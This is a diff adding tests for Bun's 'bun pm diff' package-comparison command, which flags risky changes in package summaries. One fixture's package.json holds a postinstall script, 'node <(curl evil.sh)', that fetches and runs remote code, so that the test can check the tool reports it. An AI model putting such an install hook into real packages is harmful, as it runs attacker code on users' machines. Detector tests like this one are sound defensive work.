@@ -215,6 +215,13 @@ diffme@1.0.0 → diffme@2.0.0
     expect(exitCode).toBe(0);
   });
 
+  test("one folder: the registry side is named by that folder's package.json, not the project's", async () => {
+    // From proj/ (name "proj") pointing at ../v1 (name "diffme"): must look up diffme@latest.
+    const { stdout, exitCode } = await diff(["../v1", "--name-only"], join(String(root), "proj"));
+    expect(stdout.split("\n")[0]).toBe("diffme@2.0.0 → ../v1");
+    expect(exitCode).toBe(0);
+  });
+
   test("a folder against a tarball, no registry involved", async () => {
     const { stdout, exitCode } = await diff(["./v1", tarballs["2.0.0"], "--name-only"]);
     expect(stdout.split("\n")[0]).toBe(`./v1 → ${tarballs["2.0.0"]}`);
@@ -273,7 +280,8 @@ diffme@1.0.0 → diffme@2.0.0
       stdout: "pipe",
       stderr: "pipe",
     });
-    const [raw, exitCode] = await Promise.all([p.stdout.text(), p.exited]);
+    const [raw, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
+    expect(stderr).toBe("");
     expect(raw).toContain("\x1b[");
     const text = raw.replace(/\x1b\[[0-9;]*[mK]/g, "");
     expect(text).toContain("diffme 1.0.0 → 2.0.0\n");
@@ -307,7 +315,7 @@ diffme@1.0.0 → diffme@2.0.0
 
 // The terminal view re-prints JS/CSS/JSON through Bun's parser and printer before diffing, so only changes in
 // meaning survive. These run folder-against-folder; no registry involved.
-describe("bun pm diff (canonical re-print)", () => {
+describe.concurrent("bun pm diff (canonical re-print)", () => {
   async function pretty(files: Record<string, string | Record<string, string>>, args: string[] = []) {
     using dir = tempDir("pm-diff-ast", files);
     await using p = Bun.spawn({
@@ -366,9 +374,10 @@ describe("bun pm diff (canonical re-print)", () => {
       "+     return b(a1, 1) * 3;",
     ]);
     // --raw turns all of that off: one giant line each way.
+    expect(exitCode).toBe(0);
     const raw = await pretty({ "a/dist/x.min.js": v1, "b/dist/x.min.js": v2 }, ["--raw"]);
     expect(raw.text).toMatch(/\ndist\/x\.min\.js ─+ \+1 -1\n/);
-    expect(exitCode).toBe(0);
+    expect(raw.exitCode).toBe(0);
   });
 
   test("--minify folds equivalent syntax; --unminify renames locals in lockstep even in readable files; -w", async () => {
@@ -396,6 +405,20 @@ describe("bun pm diff (canonical re-print)", () => {
     // --unformatted is --raw.
     const raw = await pretty(files, ["--unformatted"]);
     expect(raw.text).toMatch(/\nflags\.js ─+ \+1 -1\n/);
+  });
+
+  test("package.json text in the summary is shown literally, angle brackets and all", async () => {
+    const { text } = await pretty({
+      "a/package.json": JSON.stringify({ name: "x", version: "1.0.0", dependencies: { y: "^1.0.0" } }),
+      "b/package.json": JSON.stringify({
+        name: "x",
+        version: "1.0.1",
+        dependencies: { y: ">=1.3.0 <2" },
+        scripts: { postinstall: "node <(curl evil.sh)" },
+      }),
+    });
+    expect(text).toContain("▲ postinstall script added: node <(curl evil.sh)\n");
+    expect(text).toContain("▲ dependencies y: ^1.0.0 → >=1.3.0 <2\n");
   });
 
   test("summary calls out new builtin imports, risky APIs, and skips source maps", async () => {
